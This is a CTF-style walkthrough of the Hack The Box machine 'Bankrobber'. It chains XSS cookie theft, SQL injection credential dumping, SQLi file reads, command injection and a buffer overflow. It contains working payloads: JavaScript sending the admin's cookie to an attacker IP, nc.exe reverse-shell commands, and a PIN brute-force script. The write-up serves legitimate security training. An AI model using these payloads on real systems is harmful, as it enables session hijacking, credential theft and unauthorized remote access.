

![1](</Writeups/Machines/Bankrobber/img/logo.png>)
By Rug4lo

## Reconnaissance 

First of all we're going to run a port scan with `Nmap`
```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.154
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 13:04 CET
Initiating SYN Stealth Scan at 13:04
Scanning 10.10.10.154 [65535 ports]
Discovered open port 3306/tcp on 10.10.10.154
Discovered open port 80/tcp on 10.10.10.154
Discovered open port 445/tcp on 10.10.10.154
Discovered open port 443/tcp on 10.10.10.154
Completed SYN Stealth Scan at 13:04, 26.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.154
Host is up, received user-set (0.039s latency).
Scanned at 2023-11-08 13:04:01 CET for 26s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
443/tcp  open  https        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
3306/tcp open  mysql        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 24 (1.056KB)
```
We can see it has a website on port 80 and another one on 443 (which are identical)

We also see that the SMB port is open, but if we use **smbmap** we'll see it won't let us connect 

So let's go into the website on port 80, where we'll find a login section and another one to create a user

![1](</Writeups/Machines/Bankrobber/img/1.png>)

If we create a user and log in, we'll see there's a section to send bitcoins


![1](</Writeups/Machines/Bankrobber/img/2.png>)

If we try to send any amount to some user we'll see that the transfer request has to be reviewed by an administrator first, which means they are reading the message

![1](</Writeups/Machines/Bankrobber/img/3.png>)

## XSS Cookie hijacking

Seeing this, and that along with the amount of coins we can also send a message, we can try an XSS

To do this we spin up a python server and send this text in the message, so that it tries to load a file called pwned.js (in my case I opened the python server on port 8081)
```bash
<script src="http://10.10.14.15:8081/pwned.js"></script>
```
![1](</Writeups/Machines/Bankrobber/img/4.png>)

Now we have to wait a bit for the administrator to look at our request, and check that we get a GET on our python server (this machine acts up a little, so sometimes you have to send the request several times)

![1](</Writeups/Machines/Bankrobber/img/5.png>)

Perfect, the request comes in, so now we can create a file called pwned.js containing code that steals the administrator's cookie and sends it to us; the script would be something like this
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.15:8081/?cookie=' + document.cookie, true);
request.send();
```
If everything works correctly we should receive the administrator's token

![1](</Writeups/Machines/Bankrobber/img/6.png>)

Now we just have to swap it for ours

![1](</Writeups/Machines/Bankrobber/img/7.png>)

And refresh the page to get straight into /admin/

![1](</Writeups/Machines/Bankrobber/img/8.png>)

In /admin we can see two interesting things, a user search box and a panel to run commands

![1](</Writeups/Machines/Bankrobber/img/9.png>)

We can try running commands, but it will tell us we can only run the dir command, from localhost

![1](</Writeups/Machines/Bankrobber/img/10.png>)

## SQLI Explotation

So we can try the other panel, and since it searches by id we can test whether it's vulnerable to a SQLI

To do that we're going to intercept the request with `Burpsuite`

![1](</Writeups/Machines/Bankrobber/img/11.png>)

We can see it works! (there are a lot of users created by other people that aren't the machine's original ones; the original ones are: admin and gio)

![1](</Writeups/Machines/Bankrobber/img/12.png>)

Now we can start enumerating the information in the databases, to see if we find anything useful

First we find out the number of columns it has

![1](</Writeups/Machines/Bankrobber/img/13.png>)

Now we can use union select to enumerate the databases

![1](</Writeups/Machines/Bankrobber/img/14.png>)
![1](</Writeups/Machines/Bankrobber/img/15.png>)

With the databases in hand, we can enumerate the tables of the bankrobber database 

![1](</Writeups/Machines/Bankrobber/img/16.png>)
![1](</Writeups/Machines/Bankrobber/img/17.png>)

We enumerate the information in the users table

![1](</Writeups/Machines/Bankrobber/img/18.png>)
![1](</Writeups/Machines/Bankrobber/img/19.png>)

And finally we dump the contents of the username and password fields

![1](</Writeups/Machines/Bankrobber/img/20.png>)
![1](</Writeups/Machines/Bankrobber/img/21.png>)

Now we have the password for the admin user and for the gio user

We can also enumerate the mysql database the same way, where we'll find the root user's password

![1](</Writeups/Machines/Bankrobber/img/22.png>)
![1](</Writeups/Machines/Bankrobber/img/23.png>)

Looking at this hash it seems to be an md5sum, so we're going to use a site to crack it

site --> https://hashes.com/en/decrypt/hash

![1](</Writeups/Machines/Bankrobber/img/24.png>)

Perfect, we now have 3 passwords and 3 users

Now that we're done with the SQLI for the moment we can browse around the site, where we'll find something interesting

![1](</Writeups/Machines/Bankrobber/img/25.png>)

We see some notes telling us there are files in Xampp's default folder; if we look it up we'll see this is Xampp's default path
```bash
C:/xampp/htdocs
```
## SQLI to LFI

So /admin will be at C:/xampp/htdocs/admin/; bearing that in mind and that we have a working SQLI, we can try to read internal files from the machine

![1](</Writeups/Machines/Bankrobber/img/26.png>)
![1](</Writeups/Machines/Bankrobber/img/27.png>)

Seeing that we can successfully read files from the machine, we can try to read the contents of the php that was restricting command execution

![1](</Writeups/Machines/Bankrobber/img/28.png>)

We see it only checks that dir is being used, so we could chain a command like `dir | powershell -c "\\\\10.10.14.13\\smbFolder\\nc.exe -e cmd 10.10.14.13 4444` but it only allows commands to be run from localhost

## XSS to run commands

Seeing this, we can make the administrator send a request to this php through the earlier XSS so that it runs a reverse shell for us and we gain access to the machine

First we're going to modify pwned.js so it looks like this:
```javascript
var request = new XMLHttpRequest();
params = 'cmd=dir|powershell -c "\\\\10.10.14.15\\smbFolder\\nc.exe -e cmd 10.10.14.15 4444"';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
request.send(params);
```
Now we have to go to wherever we have our nc.exe and start an SMB server in that directory
```bash
python3 smbserver.py smbFolder $(pwd) -smb2support
```
Once this is done we use netcat to listen on port 4444 and send the XSS

![1](</Writeups/Machines/Bankrobber/img/29.png>)

If everything went well, we'll see how we gain access to the machine

![1](</Writeups/Machines/Bankrobber/img/30.png>)

Now we can read the user flag

![1](</Writeups/Machines/Bankrobber/img/31.png>)

## Privilege escalation

If we go to the root of the drive we'll see a curious .exe

![1](</Writeups/Machines/Bankrobber/img/32.png>)

We can check whether there's any process running this .exe

![1](</Writeups/Machines/Bankrobber/img/33.png>)

We see this process's PID is 1656, so we can look for whether it's listening on some port

![1](</Writeups/Machines/Bankrobber/img/34.png>)

We can see it's running on port 910; seeing this we can use chisel to do port forwarding and work from our own machine more comfortably

This would go on our machine 

![1](</Writeups/Machines/Bankrobber/img/35.png>)

And this on the windows box

![1](</Writeups/Machines/Bankrobber/img/36.png>)

With this we can see that we're able to connect to the utility, and that when we connect it asks us for a 4-digit pin 

![1](</Writeups/Machines/Bankrobber/img/37.png>)

Since brute-forcing passwords that short is very easy, we write ourselves a python script (first we create a file called pins.txt with every combination from 0001 to 9999)
```python
#!/usr/bin/python3

from pwn import *
import time, pdb
	
def tryPin():
    pins = open("pins.txt", "r")
    p1 = log.progress("Fuerza bruta")
    p1.status("Comenzando proceso de fuerza bruta")
    time.sleep(2)
    
    counter = 1
    for pin in pins:
        p1.status("Probando con el PIN %s [%s/10000]" % (pin.strip('\n'), str(counter)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 910))
        data = s.recv(4096)
        s.send(pin.encode())
        data = s.recv(1024)
        
        if b"Access denied" not in data:
            p1.success("El PIN correcto es: %s" % (pin.strip('\n')))
        counter += 1
        
if __name__ == '__main__':
	
    tryPin()
```
Running this script we'll see the pin is 0021

![1](</Writeups/Machines/Bankrobber/img/38.png>)

Now we can authenticate and we'll see it asks us for an amount, and then runs a command

![1](</Writeups/Machines/Bankrobber/img/39.png>)

That looks a bit fishy, so we can try a BufferOverflow; we'll see that with just a few characters we're able to overwrite the command, so now it's just a matter of putting in whatever command we want, in my case a reverse shell (we transfer nc.exe to the windows machine)

![1](</Writeups/Machines/Bankrobber/img/40.png>)

Now we'd simply have to enter this string and start a netcat listener
```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\privesc\nc.exe -e cmd 10.10.14.15 4444
```
With this we'll have a shell as admin, and we'll be able to read the root flag
